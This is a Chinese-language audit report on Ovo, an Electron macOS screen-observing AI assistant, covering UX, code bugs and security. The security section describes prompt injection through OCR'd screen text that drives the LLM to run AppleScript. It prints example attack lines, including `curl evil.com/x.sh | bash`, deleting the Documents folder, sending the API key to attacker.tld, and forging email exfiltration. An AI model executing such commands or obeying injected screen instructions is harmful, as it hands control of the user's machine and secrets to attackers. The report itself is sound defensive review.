# Ovo 综合审查报告

> 审查日期：2026-05-15 / 2026-05-16 增补
> 审查范围：main 分支当前工作树（含未提交修改）
> 审查代码量：约 19,300 行 TS/TSX（electron 38 个模块 + React 三窗口）
> 视角：① macOS 资深用户的产品体验审查；② Electron + React + TS 技术审查；③ 安全工程师视角的攻击面分析；④ OCR 数据落地与扩展审计

**最关键的一句话**：当前 Ovo 最大的隐患是「**屏幕内容 → LLM → osascript / open 自由执行**」的攻击闭环——一条 prompt injection 就可能拿到主机控制权。这条必须先堵。其余按下文优先级修复。

---

## 优先级修复路线（综合 3 个视角）

### 必须立即修（P0 / CRITICAL，72 小时内）

| # | 类别 | 文件:行号 | 一句话 |
|---|---|---|---|
| 1 | 安全 | `electron/agent-executor.ts:177-191` | osascript 黑名单可被任意 AppleScript 绕过 |
| 2 | 安全 | `electron/agent-executor.ts:162-175` | `open` 允许 `file://` + 绝对路径，可开私钥/任意 app |
| 3 | 安全 | `electron/macos-actions.ts:26-66` | AppleScript 模板字符串拼接，`\n` 可逃逸 |
| 4 | 安全 | `src/stores/settingsStore.ts:57` | Claude API key 明文落 localStorage |
| 5 | 安全 | `electron/ipc-handlers.ts:1492-1516` | `action:confirm` 信任 renderer 传的 action，可被 XSS 伪造 |
| 6 | 代码 | `electron/agent-bridge.ts:228` | fetch 无 AbortSignal 超时，pipeline 会单点 hang |
| 7 | 代码 | `electron/event-processor.ts:6-47` | Levenshtein O(n·m) 阻塞主进程 |
| 8 | 代码 | `electron/feedback-engine.ts:16-26` | 反射访问私有 db 字段，失败静默 |
| 9 | 产品 | `src/index.css:1` | 启动时远程拉 Google Fonts，国内白屏 |
| 10 | 产品 | `electron/main.ts:413` | 窗口 backgroundColor `#0a0a14` 与浅色主题闪屏 |
| 11 | 产品 | `src/index.css:20-25` | 主色用微信绿 `#07c160`，品牌错位 |
| 12 | 产品 | `electron/main.ts:38-73` | 无 Application Menu，Cmd-, / Cmd-W / Cmd-Q 不工作 |

### 2 周内修（P1 / HIGH）

详见后文各部分。建议优先：
- 启用 `sandbox: true`、注册 `setWindowOpenHandler`
- SQLite 加密（OCR/人格画像明文落盘）
- `windowTitle` 同样走 `redactSensitive`
- `agent-bridge` baseUrl 白名单
- 拆分 `ipc-handlers.ts`（1805 行）和 `knowledge-graph.ts`（1950 行）
- 去掉 `ovoAPI.invoke` 通用入口，破坏性操作主进程二次确认
- 设计系统统一：删 Card 堆砌、收敛字号阶梯、删全局 `scale(0.98)`、FloatingIcon 加阴影

### 慢慢打磨（P2）

- 类型双向化（IPC payload 不再 `any`）
- 滚动条、Toggle 弹性动画
- 文案术语统一（去 jargon、去 emoji、去 markdown 残留）

---

## 一、产品体验审查 — macOS 资深用户视角

通览 `App.tsx`、`index.css`、4 个 Console 主面板、`FloatingIcon`、`SuggestionPanel/Card`、所有 `shared/*` 基础组件、`window-manager.ts`、`main.ts`。Ovo 在功能上诚意十足，但视觉与交互上充斥着「WeChat × 中后台 Web Console × Linear 仿品」的混搭气，离一款「我愿意付费、愿意常开」的原生 macOS app 还差最关键的那一层精修。

### P0 — 用户立即流失的硬伤

#### UX-1 [P0] `src/index.css:1` — 顶部强制远程加载 Google Fonts (`DM Sans`)
- **苹果用户为什么嫌弃**：① 桌面 app 启动闪屏前依赖外网，第一眼字体跳变（FOIT/FOUT）；② 国内用户 `fonts.googleapis.com` 经常被墙，离线启动看到 fallback 字体；③ 一款「主动观察屏幕」的助手在启动瞬间向 Google 发 HTTP 请求，对隐私敏感用户是减分项。原生 macOS app 永远直接用系统字体栈。
- **修复**：删 `@import`，`font-family` 改成 `"SF Pro Text", -apple-system, BlinkMacSystemFont, "PingFang SC", system-ui, sans-serif`，正文 13px、标题 15px。

#### UX-2 [P0] `electron/main.ts:413` — Console 窗口 `backgroundColor: "#0a0a14"` 几乎全黑，但应用是浅色主题
- **苹果用户为什么嫌弃**：light 主题或刚启动未读取 settings 时，会闪一下深紫黑底再变白底（白闪/黑闪），这是廉价 Electron 套壳最典型的「灵魂破窗」。
- **修复**：`backgroundColor` 跟随 `nativeTheme.shouldUseDarkColors`，默认 `#f5f5f5` 或 `#1a1a1a`。

#### UX-3 [P0] `src/index.css:20-25` — 主色 `#07c160` 是微信绿
- **苹果用户为什么嫌弃**：这色 = WeChat = 即时通讯工具，用在「AI 桌面观察助手」上品牌错位。`index.css:4` 注释直接写「WeChat Mac 风格设计系统」，「AI 助手 = 抄微信」是定位性灾难。Apple 的系统色板有 systemBlue、systemTeal、systemIndigo 才是「工具理性、克制、属于操作系统的一部分」的暗示。
- **修复**：换成 `systemBlue` (`#0a84ff` dark / `#007aff` light) 或 `systemTeal`，删除所有「WeChat 规范」注释。

#### UX-4 [P0] 窗口标题写死中文工程师叫法
- 位置：`electron/main.ts:407`「ovo 控制台界面」、`window-manager.ts:466`「ovo 悬浮球」、`main.ts:365`「ovo 建议浮窗」
- **苹果用户为什么嫌弃**：macOS 的「窗口」菜单、Mission Control、Cmd-Tab 都会展示这些标题。原生 app 要么是 "Ovo"、要么是当前文档名，绝不会出现「建议浮窗」这种内部叫法。瞬间暴露「未抛光的 Electron 项目」。
- **修复**：主窗口 `Ovo`；悬浮球应无标题（`title: ""` + 不进 Cmd-Tab）。

#### UX-5 [P0] `electron/main.ts:38-73` — Tray 菜单只有「打开控制台 / 退出」，无 Application Menu
- **苹果用户为什么嫌弃**：① 原生 macOS menubar app（Bartender、Things、Fantastical、1Password）都给：状态预览、最近建议、暂停/恢复、设置、关于、退出；② 没设 `Menu.setApplicationMenu`，Cmd-, 打开偏好、Cmd-W 关窗、Cmd-Q 退出都不会工作，这是 macOS 一级缺陷。
- **修复**：注册完整 menubar（File/Edit/View/Window/Help）+ 标准快捷键；Tray 加「暂停 15 分钟/1 小时/打开控制台/设置/退出」，左键应是 toggle。

#### UX-6 [P0] `electron/main.ts:425-480` — FloatingIcon 窗口 `hasShadow: false`、280×108 但球只 88×88
- **苹果用户为什么嫌弃**：① 无阴影 = 像「贴」在屏幕上而非「浮」（对比 Spotlight、Sidecar 都带柔和阴影）；② 球四周有 96px 不可视但仍吃 hover/click 的「鬼影空间」；③ `resizable: true` 在 frameless 浮窗上无意义却引入 trackpad resize 热区。
- **修复**：球本体 88×88 窗口，sticky 展开切换到独立 panel 窗口或动态 `setBounds`；`hasShadow: true`、`resizable: false`。

### P1 — 明显廉价感

#### UX-7 [P1] `src/components/Console/ConsoleSidebar.tsx:27` — 侧栏 72px、图标 40×40、字 10.5px
- 微信 Mac 的精确复制（连 10.5px 这种非整数 px 都抄了）。macOS 原生侧栏（Finder/Mail/Notes/Linear）要么 ≥220px sidebar，要么 88px 图标 22px 字 11px。10.5px 在 Retina 上次像素 hinting 渲染发糊。
- **修复**：扩到 200px sidebar 风格 或 88px+图标 22px+字 11px；active 态用 `accentColor` 圆角矩形而非纯实心绿。

#### UX-8 [P1] `src/components/shared/Card.tsx` 全项目滥用
- `rounded-xl border bg-card p-4 shadow-sm` 的卡片被无脑套在所有内容上。「卡片堆砌」是 Web 后台/Notion 模板的标签。原生 macOS（系统设置、Mail、Notes）几乎从不画 border + 阴影 + 圆角，而用**空白间距 + 分组标题 + hairline 分隔线**。`SettingsPanel.tsx` 8 个连续 `<Card>` 像 Notion 不像 macOS Settings。
- **修复**：参照 macOS Ventura+ Settings.app，section 标题 11px 全大写灰色 + 内容无 border，组间 24-32px 留白。

#### UX-9 [P1] `src/components/shared/GlowButton.tsx` + `src/index.css:146` 全局 `button:active { transform: scale(0.98); }`
- ① 全局 `scale(0.98)` 是 iOS 触摸反馈，macOS 鼠标点击从不缩放；② 实心彩色按钮+白字+轻阴影是 Material/Tailwind 默认审美，不是 macOS。Ventura+ 主按钮是 vibrancy 蓝底 + 圆角 6px + 字 13px medium。
- **修复**：删全局 `transform: scale`；GlowButton 改 `rounded-md px-3.5 py-1.5 text-[13px] font-medium`。

#### UX-10 [P1] 字号泛滥 — 至少 7 种字号（9/10/10.5/11/11.5/12/12.5/13/14/15/16/18/20）
- 例：`SuggestionCard.tsx:118` 优先角标 `text-[9px]`。Apple HIG 的 macOS 字体阶梯只有 6 档（11/12/13/15/17/22）。9-10.5px 在标准 Retina 上发糊。
- **修复**：定义 6 档 type scale，禁用 <11px。

#### UX-11 [P1] `src/components/Console/MemoryPanel.tsx:319-336` — 「列表/图谱」切换用实心绿按钮
- 这是 segment control 位置。macOS 原生 `NSSegmentedControl` 是浅灰胶囊背景里 active 段白色+轻阴影，绝不是纯绿实色块。
- **修复**：active 段 `bg-content shadow-sm`、inactive 透明。

#### UX-12 [P1] `src/components/Console/SettingsPanel.tsx:585` — UI 文案出现 markdown 加粗 `**人工 review**` 字面量 + 英文 jargon
- 「review」「pipeline」「prompt」「agent」「backend」「DEV」「OCR」反复出现在用户文案中。Apple 文案永远把工程术语翻译成生活语言（「录音」而不是「音频流」）。
- **修复**：清掉所有 markdown 标记；术语映射 pipeline→「流程」、review→「复核」、prompt→「提示词」、agent backend→「AI 引擎」。

#### UX-13 [P1] `src/components/SuggestionPanel/SuggestionPanel.tsx:26-29` — 红点 `animate-ping` 持续脉动
- `animate-ping` 是 1s 周期持续无限的强对比脉动，相当于「屏幕角持续闪烁」。Apple 状态指示从来不在常态下持续闪。常驻 ping 是 SaaS 仪表盘审美，桌面助手装这玩意儿一天用户就关 toast。
- **修复**：常态静态 dot；仅有 unread 时短暂脉 1-2 次后停。

#### UX-14 [P1] `electron/main.ts:131-137` — Toast 380×260 一次堆 3 张 30 秒
- ① 在 13" MBP 上几乎占屏 1/8，3 张堆叠遮去半面；② macOS 已有标准 Notification Center，第三方再造一套 toast 一定要更轻或不做。Apple 自家 Spotlight/Reminders 通知都走系统通知。
- **修复**：默认走 `new Notification()`，仅 critical tier 用自渲染 toast 且 320×120；3 张 → 1 张栈式覆盖。

#### UX-15 [P1] `src/components/Console/ConsoleListPanel.tsx:140` — 列表项 active 用 `border-l-[3px]` 左侧色条
- Slack/VS Code 的活跃指示语言。macOS 原生（Mail、Messages、Finder sidebar）选中是**整行强调色+文字反色**，没有左侧色条。
- **修复**：删 `border-l-[3px]`，active 整行 `bg-accent text-white`。

#### UX-16 [P1] `src/components/Console/MemoryPanel.tsx:444, 462, 489` — 文案人格分裂
- 一会儿「ovo 在学习中~~」小学生口吻，一会儿「Pipeline `pipeline-abc12345`」开发者残留（`PipelinePanel.tsx:132`）。Apple 文案是对所有用户层级保持同一种成年克制语气：不卖萌、不写「嗨~」、避免 jargon。
- **修复**：定语气表（参 Apple Style Guide 中文版）；删 emoji（✦/⏸/✕/★/🤖）和小机灵话。

### P2 — 细节打磨

| # | 文件 | 一句话问题 |
|---|---|---|
| UX-17 | `src/index.css:55-56` | 阴影 `0 4px 12px rgba(0,0,0,0.1)` 是 Web 通用阴影，非 macOS 双层阴影 |
| UX-18 | `src/components/shared/Toggle.tsx` | 无 spring 动画，thumb 切换僵硬 |
| UX-19 | `src/index.css:169-185` | 滚动条 `6px` 永久显示，偏离 macOS overlay scroll 设定 |
| UX-20 | `src/components/FloatingIcon/FloatingIcon.tsx:223-244` | 红色「!」角标 9px 糊；tooltip 纯黑/85 在浅色桌面上「洞穿」 |
| UX-21 | `src/components/Console/AboutPanel.tsx:50` | 用 `window.alert()` 弹版本号，90 年代 Web 1.0 体验 |
| UX-22 | `src/components/Console/PipelineStageCard.tsx:13` | `<pre className="bg-black/30">` 在浅色主题下黑底白字突兀 |

### 「只能修一处」的三件事

1. **删微信绿，换 systemBlue/systemTeal**（10 分钟，立刻「长得像 macOS app」）
2. **重做 SettingsPanel 视觉**（去 Card 化，参考 Ventura+ Settings.app）
3. **FloatingIcon 压到 88×88 + 加阴影 + 走系统通知中心**

---

## 二、代码审查 — 资深 Electron/React/TS 工程师视角

### P0 — 会崩 / 数据安全 / 严重逻辑错

#### CODE-1 [P0] `electron/agent-bridge.ts:25` — ANSI 转义剥离 regex 漏 ESC 前缀，会误删 LLM 输出
- 当前 regex `/\[[0-?]*[ -/]*[@-~]/g` 缺 `\x1b` 前缀，会把任何 `[XXX字母]` 形式吞掉，例如 `[已确认]`、`[done]`、`[OK]` 全被无声删除。
- 配合第 27 行的 unicode 盲文区 `⠀-⣿` 也会误伤。
- **修复**：改成 `/\[[0-9;?]*[ -/]*[@-~]/g`；装饰字符剥离限制为开头若干行。
- 置信度：9/10

#### CODE-2 [P0] `electron/event-processor.ts:6-47` — Levenshtein O(n·m) 阻塞主进程
- 每次 append 调 `similarity(lastFullText, entry.text)`，2000 字 string 4M 单元矩阵 + O(n·m)。N 个窗口并行 + auto-capture 5s/次 → 主线程被卡几百毫秒到秒级，阻塞 IPC、托盘、悬浮球拖动。
- **修复**：长度差 > 30% 直接判不同；否则跳到 hash/shingle（simhash 或前缀 256 字 jaccard），或截到前 500 字。
- 置信度：9/10

#### CODE-3 [P0] `electron/ipc-handlers.ts` — 92 个 `ipcMain.handle` 无重复注册保护
- Electron 文档明确："If there is already a handler for this channel, this method throws."。dev 模式 reload 或测试注入会抛"second handler for channel"。
- **修复**：`safeHandle(channel, fn)` 包装，先 `removeHandler` 再 `handle`。
- 置信度：8/10

#### CODE-4 [P0] `electron/agent-bridge.ts:228-241` — fetch 无 AbortSignal 超时
- `timeout = request.timeout ?? 30_000` 只传给 `execa`，走 `api` 分支时 fetch 完全无超时。后端 hang → scheduler 卡死 → 所有后续 OCR 不再触发 LLM，看起来"ovo 死了"。
- **修复**：`fetch(url, { signal: AbortSignal.timeout(timeout) })`；`response.json()` try-catch 包，因为 LLM API 可能返回非 JSON。
- 置信度：10/10

#### CODE-5 [P0] `electron/knowledge-graph.ts:1658, 1681-1685` — LIKE 不转义 `%` `_`
- `searchEntities` 把 query 直接拼进 `%${keyword}%`，`prepare` 防注入但 `%`/`_` 不转义。用户搜 `100%` 或 `a_b` 全表扫且语义错乱（`_` 是 LIKE 单字符通配）。
- **修复**：转义 `%` 和 `_`，用 `LIKE ? ESCAPE '\\'`；或 FTS5。
- 置信度：8/10

#### CODE-6 [P0] `electron/feedback-engine.ts:16-26` — 反射访问私有 db 字段
- `as unknown as { db?: unknown }` 强行掏出 KG 私有 db；失败 `if (!db) return id;` 静默吞，用户点踩根本没写库，UI 还以为成功。
- **修复**：给 `KnowledgeGraphEngine` 暴露 `insertFeedback()` 方法，删反射路径。
- 置信度：10/10

### P1 — 明显 bug / 维护噩梦

#### CODE-7 [P1] `electron/main.ts:488, 497, 550, 558` + `error-logger.ts:53-59` — 三处重复注册 `uncaughtException` / `unhandledRejection`
- 同一错误同时触发 3 个 handler，写 3 倍告警；Node `MaxListenersExceededWarning`。
- **修复**：只在 `bootstrap()` 注册一次；或显式 `removeAllListeners` 再 `on`。
- 置信度：9/10

#### CODE-8 [P1] `electron/auto-capture.ts:343-344` — `history.slice(0, 100)` 每次 capture 全数组复制
- `unshift` O(n) + `slice` O(n)，N 窗口 N 次。history 含 `text: string`，可能上千字。
- **修复**：环形缓冲 或 push + 截尾；text 字段限长 500。
- 置信度：7/10

#### CODE-9 [P1] `electron/ipc-handlers.ts:1116` — `dev:run-sample-pipeline` 生产可用
- 任何 renderer 代码（含 XSS）都能触发伪 OCR 流程，污染 KG、消耗 LLM 配额。
- **修复**：`if (!isDev) return`；preload allowlist 剔除生产打包。
- 置信度：7/10

#### CODE-10 [P1] `electron/ipc-handlers.ts:613-1041` — `runPipelineForWindow` 上帝函数 448 行
- 6 个 stage + KG 写入 + 广播堆在一起，跨 stage 状态共享靠 `(response as { parsed }).parsed = merged` 重写，可读性极差；Pass 1/Pass 2 失败 fallback 不对称。
- **修复**：抽 `PipelineRunner` 类，每 stage 一 method 返 `{status, output, error}`。
- 置信度：9/10

#### CODE-11 [P1] `electron/ipc-handlers.ts:136-1805` — `registerIpcHandlers` 1670 行
- 一个函数注册 92 个 IPC handler + 5 个 scheduler + pipeline 编排 + backend detection + receipts builder。
- **修复**：按域拆 `ipc/kg.ts`、`ipc/capture.ts`、`ipc/pipeline.ts`、`ipc/permissions.ts`、`ipc/feedback.ts`、`ipc/dev.ts`。
- 置信度：10/10

#### CODE-12 [P1] `electron/knowledge-graph.ts:1-1950` — KG 1950 行，迁移静默吞错
- 单类 50+ 公开方法。迁移逻辑 `try { ALTER ... } catch { /* swallow */ }`（行 179/201/213/227）——任何 ALTER 在生产库失败后，依赖该列的代码全部静默错误，但抛错位置取决于哪条 SQL 先访问该列，难以排查。
- **修复**：① 抽 `migrations.ts`，失败 throw + alert critical；② 拆 KG 为 `EntityStore` / `RelationStore` / `EventStore` / `BusinessLogStore` / `PipelineStore` / `InsightAggregator`。
- 置信度：9/10

#### CODE-13 [P1] `electron/knowledge-graph.ts:1058, 1074` — `runEntityGC` 两次全表 scan + JS 端两次同样过滤
- entities 上万条时浪费 IO 和内存。`fuzzyOvoIds` 与 `blacklistedIds` 基于同一份数据。
- **修复**：一次取出，合并过滤，合并 DELETE。
- 置信度：7/10

#### CODE-14 [P1] `electron/tts-engine.ts:45-73` — MsEdgeTTS stream 无取消
- 组件卸载/切歌时 fetch 在背景继续跑到 30s timeout，listener 不清理；快速连发会创建多 socket。
- **修复**：AbortController + finally 清理；并发请求去重。
- 置信度：7/10

#### CODE-15 [P1] `electron/knowledge-graph.ts:1817-1821` — `clearAll` 不删 `user_feedback` / `prompt_eval_suggestions`
- 用户点"清空 KG"后反馈表残留，`getFeedbackStatsByIntent` 仍返回旧数据，行为不一致。
- **修复**：纳入清除清单；用事务包。
- 置信度：8/10

#### CODE-16 [P1] `electron/ipc-handlers.ts:442-451` — `setTimeout(() => kg.runEntityGC(), 5_000)` 无 cleanup
- 5 秒内 quit → GC 跑在已 close 的 db 上，抛 "The database connection is not open"。
- **修复**：保留 handle，`before-quit` clearTimeout。
- 置信度：8/10

#### CODE-17 [P1] `electron/agent-response-normalize.ts:385-396` — 强制 actions ≥ 1 的兜底污染 KG
- LLM 没出 action 时本地塞 `log_note: "归档当前屏幕活动到知识库（自动兜底）"`，`action-executor.ts:119` 把它写进 `memory_events`。多轮后 `memory_events` 表充斥重复占位文本，污染 `getRecentEvents`。
- **修复**：兜底 log_note 不 enqueue 到 KG；或改 `action.type = "skip"`。
- 置信度：9/10

#### CODE-18 [P1] `electron/logger.ts:80, 119` `error-logger.ts:74` `system-logger.ts:26` — `appendFileSync` 主进程同步写文件
- 每条日志阻塞 event loop。高频 pipeline 日志（每 5 秒 N 个 stage × 2 文件 = 数十次 sync write）持续短阻塞 + 配合 CODE-2 的 Levenshtein → UI 肉眼可见卡顿。
- **修复**：`fs.createWriteStream` 异步；或攒一秒一 flush。
- 置信度：8/10

#### CODE-19 [P1] `electron/preload.cjs:120-135` — `on()` 失败静默返回 `() => {}`
- 渲染端不知道订阅没生效，UI 静默卡死（toast 永远收不到事件）。
- **修复**：失败抛同步 Error；`invokeChecked` 把错误 dispatch 给主进程 logger。
- 置信度：7/10

#### CODE-20 [P1] `electron/auto-capture.ts:298-315` — OCR 失败只 `recordStat(false)` 静默
- 既不上报 alert 也不写 system log。持续失败率 100% 用户看不到。
- **修复**：前 3 次失败 `errorLogger.alert("warn")`，后降级到节流 warn。
- 置信度：8/10

### P2 — 改善建议

| # | 文件 | 一句话问题 |
|---|---|---|
| CODE-21 | `src/types/ovo.d.ts:226-232, 291, 520, 523` | IPC 事件 payload 大量 `any`，双向类型化破窗 |
| CODE-22 | `src/hooks/useCapture.ts:14` 等 | hook listener payload `any`，丢类型 |
| CODE-23 | `electron/main.ts:151, 345` | suggestion JSON 进 URL hash 可能撑爆，改 Map<id, suggestion> |
| CODE-24 | `electron/agent-bridge.ts:106-112` | backend fallback 不分 backend 计数失败，preferred 永远先试 |
| CODE-25 | `electron/agent-executor.ts:179-181` | osascript 黑名单易绕过（详见安全审查 SEC-1） |

### 大文件拆分目标

| 文件 | 行数 | 优先级 |
|---|---|---|
| `electron/knowledge-graph.ts` | 1950 | P1 — 6 个子模块 |
| `electron/ipc-handlers.ts` | 1805 | P1 — 按域拆 |
| `src/components/Console/MemoryPanel.tsx` | 1017 | P2 |
| `electron/main.ts` | 702 | P2 — SuggestionToastManager 独立文件 |
| `src/components/Console/SettingsPanel.tsx` | 677 | P2 |
| `src/types/ovo.d.ts` | 632 | P2 — 拆 `ipc-map.ts` + `entities.ts` |
| `src/components/Console/StatusPanel.tsx` | 624 | P2 |

### 总体评价

**做得好**：安全分层思路对（preload allowlist、sensitive-filter、osascript 黑名单尝试）；scheduler 单点封装并发去重；agent-response-normalize 的占位 schema 检测/二次 JSON 修复重试细致；prompt 自评/outcome_score/KG GC 形成完整的「自我进化」闭环。

**主要风险**：主进程同步阻塞（Levenshtein + appendFileSync + IPC 上帝函数）累积起来高负载下 UI 肉眼可见卡顿；KG 1950 行 + 迁移静默吞错是未来事故的发源地；IPC 类型 `any` 缺口让 renderer 重构时编译器帮不上忙；agent-bridge 的 fetch 超时缺失是单点 hang 风险，必须立刻修。

---

## 三、安全审查 — 攻击面分析

下面按严重度排序的 18 个安全问题。**重点是 LLM 输出被当成可执行命令、API 密钥明文持久化、以及 IPC 边界缺乏输入校验**。

### CRITICAL（72 小时内修）

#### SEC-1 [CRITICAL] `electron/agent-executor.ts:177-191` — LLM 规划的 AppleScript 被直接 `osascript` 执行
- **漏洞**：黑名单只过滤 `do shell script` 内的 `rm/sudo/chmod/launchctl/kextload/installer`。AppleScript 主体（`tell application "Finder" to delete`、`do shell script "curl evil.com | bash"` 等不带这 6 个关键字的攻击）全开放。
- **攻击场景**：屏幕上有恶意 OCR 文本（他人 GitHub PR、推特、邮件）→ prompt injection 让 LLM 输出 `do shell script "curl evil.com/x.sh | bash"`（不带关键字即可绕过）→ 主进程以用户权限执行任意命令。或 `tell application "Finder" to delete every item of folder "Documents"`。
- **修复**：改成动作白名单模板（仅允许预定义的 `Reminders/Calendar/Mail/Messages` 参数化模板），禁止直接接受任意 AppleScript；若必须放行 `do shell script`，彻底拒绝。
- 置信度：10/10

#### SEC-2 [CRITICAL] `electron/agent-executor.ts:162-175` + `electron/macos-actions.ts:88-97` — `open` 几乎无 scheme 限制
- **漏洞**：`agent-executor.open` 允许 `file://` + 绝对路径，仅过滤反引号/`$`/`;`；`macos-actions.openUrl` 完全不校验 scheme 丢给 `shell.openExternal`。
- **攻击场景**：① `file:///Users/<me>/.ssh/id_rsa` 用默认编辑器打开私钥；② `/Applications/Calculator.app` 开任意应用；③ macOS 上 `open file:///path/to/script.command` 配合 `.command` 后缀甚至会触发执行；④ `vbscript:`/`ms-msdt:`/`smb:` 等危险协议。
- **修复**：scheme 白名单（仅 `https:`、`http:`、`mailto:`）；禁 `file:` 与绝对路径；`shell.openExternal` 同样加白名单包装。
- 置信度：10/10

#### SEC-3 [CRITICAL] `electron/macos-actions.ts:26-66` — AppleScript 模板字符串拼接
- **漏洞**：`escapeAS` 只替换 `\` 和 `"`，AppleScript 中 `\n`/`\r` 直接结束字符串，`"` + `return` + 任意语句即可越界。`sendIMessage`、`createMailDraft`、`createReminder` 全受影响。
- **攻击场景**：LLM 给 `body = "hi\" \nset volume output volume 100\n--"` → 拼进 AppleScript 渗出额外语句。配合 SEC-1，LLM 输出有两条进入 osascript 的路径。
- **修复**：不用字符串拼接 AppleScript。改 `osascript -e ... -- arg1 arg2` 在 AS 内用 `system.arguments`，或 JXA + `--language JavaScript` + JSON 参数。
- 置信度：9/10

#### SEC-4 [CRITICAL] `src/stores/settingsStore.ts:48-99` + `electron/agent-bridge.ts:81-83` — Claude API Key 明文存 renderer localStorage
- **漏洞**：zustand `persist` 持久化 `apiKey`，默认走 renderer localStorage（Chromium `Local Storage/leveldb`，明文）；任何 renderer XSS 即可读取；主进程 `setApiConfig` 也无任何校验，存 `agentBridge` 内存中不加密。
- **攻击场景**：① 截屏中混入 `<script>` 标签，若 UI 有 `dangerouslySetInnerHTML` 即可窃取 key；② 本地恶意进程读 `~/Library/Application Support/ovo/Local Storage` 直接拿到。
- **修复**：用 `safeStorage`（Electron 原生 keychain 集成）在主进程加密落盘，renderer 永远拿不到原始 key；UI 只显示 `sk-...****`。
- 置信度：10/10

### HIGH（2 周内修）

#### SEC-5 [HIGH] `electron/ipc-handlers.ts:1362-1365` + `agent-bridge.ts:228-238` — `agent:set-api-config` 不校验 baseUrl
- **漏洞**：`baseUrl` 直接插值到 `fetch(${baseUrl}/v1/chat/completions)` 且 Authorization Bearer 头被发送。
- **攻击场景**：renderer 注入/恶意扩展调 `ovoAPI.agent.setApiConfig({baseUrl:"https://attacker.tld", key:<受害者已配 key>})`，下一次 LLM 调用就把 key 发到攻击者。
- **修复**：白名单 `https://api.anthropic.com`、`https://api.openai.com`、`https://api.deepseek.com`；校验 `https:` 协议；UI 改下拉而非自由输入。
- 置信度：9/10

#### SEC-6 [HIGH] `electron/main.ts:100-110` — BrowserWindow `sandbox: false`
- **漏洞**：虽然没开 nodeIntegration，但 `sandbox:false` 让 preload 与 main 共享更多对象、`process` 全功能。Electron 推荐 `sandbox:true` 作为额外纵深防线。
- **攻击场景**：renderer XSS 拿到原型链或残留全局对象后可触达 Node API；未来第三方依赖被引入 preload 会立刻把面打开。
- **修复**：`sandbox: true` + `webSecurity: true` + `allowRunningInsecureContent: false` + `disableBlinkFeatures: "Auxclick"`。
- 置信度：8/10

#### SEC-7 [HIGH] `electron/main.ts` 全文件 — 缺少 `will-navigate` / `setWindowOpenHandler`
- **漏洞**：renderer XSS `<a target="_blank" href="file:///etc/passwd">` 或 LLM 输出含恶意链接被塞进 `<a href>` → 新开窗口加载任意 URL，绕过 preload 白名单。
- **修复**：每个 BrowserWindow `webContents.setWindowOpenHandler(() => ({action: "deny"}))`；`will-navigate` 限制为 `localhost:5173` / `file://<app>`。
- 置信度：8/10

#### SEC-8 [HIGH] `electron/knowledge-graph.ts:67-77` — SQLite 未加密
- **漏洞**：`~/Library/Application Support/ovo/data/ovo.sqlite` 用普通 better-sqlite3 打开，无 SQLCipher。OCR 摘要、用户行为时间线、人格画像、KG 全部明文，本地任何进程（恶意 npm 包、其他 app）可直接读取。
- **攻击场景**：诱导用户跑一行 shell → 拷贝 sqlite → 30 天截屏摘要外泄。
- **修复**：`@journeyapps/sqlcipher` 或 better-sqlite3-multiple-ciphers，密钥用 `safeStorage` 派生；或至少 userData 目录 chmod 700。
- 置信度：9/10

#### SEC-9 [HIGH] `electron/auto-capture.ts:301-330` — `windowTitle` / `appName` 不脱敏
- **漏洞**：`redactSensitive` 只作用于 `ocr.text`。窗口标题里的「Reset password for user@example.com」、「Re: 合同 - 客户 XXX」、「@张三 工资单」未脱敏送 LLM 并落 SQLite。
- **修复**：`windowTitle` 在喂 prompt + 入 KG 前也跑 `redactSensitive`；`prompt-engine` 拼接处统一过滤。
- 置信度：9/10

#### SEC-10 [HIGH] `electron/ipc-handlers.ts:1665-1685` — `permissions:open-settings` osascript 模板待扩展时风险
- **漏洞**：目前 `anchor` 是受控枚举（if/else），无注入。但模板 `tell application "System Settings" to reveal anchor "${anchor}" of pane id "com.apple.preference.security"` 没有任何转义，下次扩展 target 类型一旦忘记枚举保护就立刻是 osascript 注入。
- **修复**：`anchor` 改 typed enum（`as const`）+ 字典 lookup；杜绝任何字符串拼进 osascript。
- 置信度：7/10

#### SEC-11 [HIGH] `electron/ipc-handlers.ts:1492-1516` — `action:confirm` 完全信任 renderer 传入的 AgentAction
- **漏洞**：`payload.action` 全部由 renderer 提供（id/type/params/priority/description），主进程没有 token 比对「这条 action 真的来自 ovo 的 pipeline」。XSS / 恶意扩展可直接 `{type:"send_imessage", params:{to:"...", body:"..."}}` 绕过 `requireConfirm`。
- **攻击场景**：renderer XSS → `ovoAPI.action.confirm({action:{id:"x", type:"send_email", params:{to:"attacker", body:<exfil_key>}}})` → 主进程当真用户已确认。
- **修复**：pipeline 生成 action 时主进程持有 `pendingActions: Map<id, AgentAction>`；`action:confirm` 只接 `{actionId}`，主进程从 map 取真值，验证存在性 + TTL 后才执行。
- 置信度：9/10

#### SEC-12 [HIGH] `electron/tts-engine.ts:29-65` + `ipc-handlers.ts:1596-1598` — TTS 把 LLM 输出实时外发 Microsoft Edge TTS
- **漏洞**：TTS 文本来自 suggestion，含 OCR 摘要片段。即便已脱敏，等于把屏幕内容反向外发到第三方 WebSocket。无用户开关、无明示。
- **修复**：默认关闭 TTS；开启时 UI 明确告知「文本会发送给 Microsoft」；提供仅用本地 `say` 的开关。
- 置信度：7/10

### MEDIUM

| # | 文件:行号 | 一句话漏洞 |
|---|---|---|
| SEC-13 | `electron/agent-bridge.ts:199-225` | Agent 二进制路径未校验，PATH 污染可被劫持 |
| SEC-14 | `electron/preload.cjs:127-128` | `ovoAPI.invoke(channel, payload)` 通配方法，XSS 后可一键调任意白名单 IPC |
| SEC-15 | `electron/ipc-handlers.ts:1116` | `dev:run-sample-pipeline` 生产可用，可被滥用消耗 LLM 配额 |
| SEC-16 | `electron/ipc-handlers.ts:1390-1411, 1432-1436` | `kg:clear` / `kg:export` / `privacy:set-blacklist` 主进程无二次确认 |
| SEC-17 | `electron/ipc-handlers.ts:1748-1801` | `logger:business` 把 renderer 任意字符串塞进 KG，可日志投毒 |
| SEC-18 | `electron/entitlements.mac.plist` | `disable-library-validation` 让 ovo 进程可加载任意未签名 dylib |

### 安全总结

Ovo 当前最大的安全债务是 **"屏幕内容 → LLM → osascript / open 自由执行"** 的闭环——一条 prompt injection 就能拿到主机控制权。这条必须先堵。其他都是常规 Electron 加固。

**首先做**：SEC-1 + SEC-2 + SEC-3（LLM → 系统命令路径必须白名单化）；SEC-4（API key 用 safeStorage）；SEC-11（pendingActions 引用模型）。

---

## 总体观感

